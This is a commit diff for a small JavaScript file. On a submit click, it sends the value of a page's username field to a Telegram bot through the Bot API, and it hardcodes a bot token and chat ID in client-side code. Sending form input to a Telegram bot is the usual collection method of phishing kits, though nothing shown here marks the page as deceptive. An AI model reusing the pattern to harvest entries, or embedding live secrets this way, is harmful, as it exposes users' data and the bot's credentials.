0efd58bc6208342b94ff05d927cee70ada1785c9
maksipowerless <maksipowerless@mail.ru>
2023-04-03 11:45:21 +0300

    wip

--- js/telegram/tg.js
+++ js/telegram/tg.js
@@ -1,17 +1,27 @@
-const token = '6041857280:AAGy7g18OX-GBQIU5CmzDeA12LeWrH7rSjw';
-const chatId = '433473911';
-const message = 'Hello, Telegram!';
 
-const url = `https://api.telegram.org/bot${token}/sendMessage`;
+const button = document.querySelector('input[type="submit"]');
+const data = document.querySelector('#username');
+button.addEventListener('click', function() {
+  value = data.value.trim()
+  if (!value || value.length === 0) return;
+  sendTgMessage(value)
+});
 
-const data = new FormData();
-data.append('chat_id', chatId);
-data.append('text', message);
+function sendTgMessage(str) {
+  const token = '6041857280:AAGy7g18OX-GBQIU5CmzDeA12LeWrH7rSjw';
+  const chatId = '433473911';
 
-fetch(url, {
-  method: 'POST',
-  body: data
-})
-  .then(response => response.json())
-  .then(data => console.log(data))
-  .catch(error => console.error(error));
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  const data = new FormData();
+  data.append('chat_id', chatId);
+  data.append('text', str);
+
+  fetch(url, {
+    method: 'POST',
+    body: data
+  })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error));
+}
